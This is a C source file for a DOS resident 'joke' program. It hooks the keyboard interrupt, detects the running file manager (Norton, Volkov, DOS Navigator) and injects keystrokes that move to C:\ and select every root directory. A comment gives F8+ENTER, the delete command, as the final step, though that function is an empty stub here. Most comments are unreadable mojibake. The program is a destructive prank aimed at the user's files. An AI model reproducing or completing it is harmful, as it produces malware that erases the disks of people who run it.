#include <dos.h>
#include <conio.h>
#include <stdio.h>
#include <dir.h>
#include <mem.h>
#include <stdlib.h>
#include "jokelib.h"

unsigned _stklen	= 256;
unsigned _heaplen	= 1024;

// for direct access to keyboard
int far *state =(int far *)MK_FP(0, 0x0417);
int far *head = (int far *)MK_FP(0, 0x041A);
int far *tail = (int far *)MK_FP(0, 0x041C);
int far *tail_new = 0;
int far *tail_old = 0;

// for prikol keys
BYTE nkey = 0;
BYTE current = 0;
int keys[256];

// for messages
BYTE n_mess = 0;
BYTE cur_mess = 0;
char messages[8][32];
BYTE after_key[8];

BYTE fastSTART = 0;
BYTE fastEND = 0;

BYTE shell = 0;


/* ---  NEW VECTOR 0x09 HANDLER ----------------- */
void interrupt (*old_int09)(...);
void interrupt new_int09(...)
{// ���� ��ࠡ��稪 ���뢠��� �� ����������
	int far* first;
	int far* last;
	int tail_temp;
	BYTE scan;
	BYTE i,z;

	scan = inp(0x60);
	if ((scan == 0x53) && (*state & stateLCTRL) && (*state & stateLSHIFT))
		screen[0][0].ch='*';

	(*old_int09)();// ��뢠�� ���� ��ࠡ��稪

	if (current >= nkey)// �᫨ �� ������ ���稫���
		setvect(0x09, old_int09);// �����頥� ����� �� ����
	else
	{
		disable();// ࠧ�蠥� ���뢠���
		if ( (current >= fastSTART) && (current < fastEND) )
		{
			if ( (fastEND - current) < 15 )
				z = fastEND - current;
			else
				z = 15;

			*head = 0x1E; *tail = 0x1E;// ���⪠ ���� ����������
			for (i=0; i<z; i++)
			{
				last = (int far*)MK_FP(0x40, *tail);
				*last = keys[current];
				*tail += 2;
				current++;
			}
		}
		else
		{
			tail_new = (int far*)MK_FP(0x40, *tail);
			if (tail_new != tail_old)// ����� �� ������?
			{
				tail_old = tail_new;
				first = (int far*)MK_FP(0x40, *head);
				*first = keys[current];// ����⠢��� �㦭�� �������
				current++;
			}
		}
		enable();// ࠧ�蠥� ���뢠���
	}
}// new_int09 END

/*------------- SHELL TYPE func -------------------------------*/
BYTE shell_type()
{
	unsigned mcb_seg;
	MCB_struct far *mcb;
	char name[9];
	int i;

	asm{				// ����祭�� ᥣ���� ��ࢮ�� MCB �����
		push es			// (�����㬥��஢����� �㭪�� DOS)
		mov ah, 52h
		int 21h
		mov ax,es:[bx-2]
		mov mcb_seg,ax
		pop es
	}

	do
	{
		mcb = (MCB_struct far*)MK_FP(mcb_seg,0x0);// ⥪�騩 MCB

		if (mcb->owner != 0)// �������� ����?
		{
			memset(name,0,9);// ⮣�� �����㥬 ��� ���
			for(i=0; i<8; i++)
				name[i] = mcb->name[i];

			if (!memicmp(name,"VC\0",3))
				return VC;// Volkoff Commander
			else if (!memicmp(name,"NC\0",3))
				return NC;// Norton Commander
			else if (!memicmp(name,"DN\0",3))
				return DOSNAVI;// Dos Navigator
			else if (!memicmp(name,"FAR\0",4))
				return FAR;// FAR  *NOT IMPLEMENTED*
			else if (!memicmp(name,"DC\0",3))
				return DISCOCOM;// Disco Commander *NOT IMPLEMENTED*

		}

		mcb_seg += mcb->size + 1;// ���室 � ᫥���饬� MCB �����

	} while (mcb->sign == 0x4D);// ���� ����� �� �������

	return NOT_FOUND;// ⠪ ��祣� � �� ��諨 :(

}// shell_type END


/*------------- ADD KEY func ----------------------------------*/
void add_key (int code)
{// �������� ������� � ᯨ᮪
	keys[nkey] = code;
	nkey++;
}

/*------------- CREATE KEYS func ------------------------------*/
void create_keys_TO_ROOT (void)
{// ᮧ���� ���ᨢ ������� (类��) ������
	char path[256];
	int disk_old=-1;
	int i = 2;

	memset(path,0,256);// 㧭��� ⥪�騩 ����
	if (!getcwd(path, 256))
	{
		printf("error: current path too long\n");
		exit(-1);
	}

	if (path[0] != 'C')// �᫨ ��� �����⨫� �� � C:
	{// �ணࠬ���㥬 ᬥ�� ��᪠
		add_key (DISK_C); //     "C"
		add_key (DISK_COLON); // ":"
		add_key (ENTER);

		disk_old = path[0]-65;// ��࠭塞 ⥪�騩 ���
		setdisk(2); // ���室�� �� ��� C:
		memset(path,0,256);// ����� ��� ����?
		if (!getcwd(path, 256))
		{
			printf("error: path on disk C: too long\n");
			exit(-1);
		}

		if (path[3] == 0)
		{
			setdisk(disk_old);
			return;
		}
		else
		{
			add_key (ENTER);
			if (shell==DOSNAVI)
				add_key (HOME);
			i = 3;
		}
	}

	// ������ ��� �� ��᪥ C:
	if (path[3] != 0)
	{// �� ���� ���� �� �������
		while (path[i])
		{// ��⠥� ������⢮ �����⠫����
			if (path[i] == '\\')
			{// ��� ������� ������塞 HOME+ENTER
				add_key (HOME);
				add_key (ENTER);
			}
			i++;
		}
	}

	// � ��୥��� ��⠫��� ���� �� HOME
	add_key (HOME);

	if (disk_old != -1)// �᫨ ��諮�� ᬥ���� ���
		setdisk(disk_old); // ���室�� �����

}// create_keys END

void create_keys_TO_SELECT (void)
{
	ffblk buf;
	char path_old[256];

	if (!getcwd(path_old, 256))
	{
		printf("error: current path too long\n");
		exit(-1);
	}
	if (chdir("C:\\"))
	{
		printf("error: can't set current path to C:\\\n");
		exit(-1);
	}

	if ( findfirst( "C:\*.*", &buf, FA_DIREC ) )
	{
		printf("error: directories on disk C: not found\n");
		exit(-1);
	}

	if (buf.ff_attrib & FA_DIREC)
	{
		fastSTART = nkey;
		add_key(INSERT);
	}

	while (!findnext(&buf))
		if (buf.ff_attrib & FA_DIREC)
			add_key(INSERT);

	add_key(GREY_PLUS);
	add_key(ENTER);

	fastEND = nkey;

	if (chdir(path_old))
	{
		printf("error: can't set current path back to old\n");
		exit(-1);
	}
}

void create_keys_TO_DELETE (void)
{
	;
}

void debug_info (void)
{
	int i;

	printf("********* DEBUG INFO ***********\n");
	for( i=0; i<nkey; i++)
		switch (keys[i])
		{
			case HOME:
				printf("%02u: HOME\n",i);
				break;
			case GREY_PLUS:
				printf("%02u: GREY +\n",i);
				break;
			case ENTER:
				printf("%02u: ENTER\n",i);
				break;
			case F8:
				printf("%02u: F8\n",i);
				break;
			case INSERT:
				printf("%02u: INSERT\n",i);
				break;
			case DISK_C:
				printf("%02u: C\n",i);
				break;
			case DISK_COLON:
				printf("%02u: :\n",i);
				break;
			default:
				printf("%02u: *ERROR*\n",i);
		};

	switch (shell)
	{
		case VC:
			printf("shell Volkoff Commander\n");
			break;
		case NC:
			printf("shell Norton Commander\n");
			break;
		case DOSNAVI:
			printf("shell Dos Navigator\n");
			break;
		case FAR:
			printf("shell FAR\n");
			break;
		case DISCOCOM:
			printf("shell Disco Commander\n");
			break;
		default:
			printf("shell NOT\n");
	}
}


/***************************  M A I N  ********************************/
void main (void)
{
	char huge *tsrstack;//  ���� ��।����� ᢮� ࠧ���
	char huge *tsrbottom;// �⮡ � ����� ������� १����⮬...
	unsigned tsrsize;//           ...���ᥣ��!
	tsrstack = (char huge*)MK_FP(_SS, _SP);
	tsrbottom = (char huge*)MK_FP(_psp, 0);
	tsrsize = ((tsrstack-tsrbottom) >> 4) + 1;// ࠧ��� � ��ࠣ��� (16 ����)

	shell = shell_type();	// ��।��塞 �� ����� �����窨 ��� �����⨫�

	create_keys_TO_ROOT();	// ��������㥬 ���� ��㤠 ��� �����⨫�
							// � ᮧ���� ���ᨢ ������� ������
							// ���� �������� �� "C:\"

	create_keys_TO_SELECT();// ��⠥� ������⢮ ��⠫����
							// � ��୥��� � �뤥�塞 �� ��

	create_keys_TO_DELETE();// F8 + ENTER

//	debug_info();

//	return;

	tail_new = (int far*)MK_FP(0x40, *tail);// ��� ��।������
	tail_old = tail_new;//        ����⢨⥫쭮 ������� ������

	old_int09 = getvect(0x09);// ��࠭��� ���� �����
	setvect(0x09, new_int09);// �⠢�� ᥡ� �� ��� ����

	keep(0, tsrsize);// ��⠥��� � ����� � ࠧ��஬ tsrsize
}

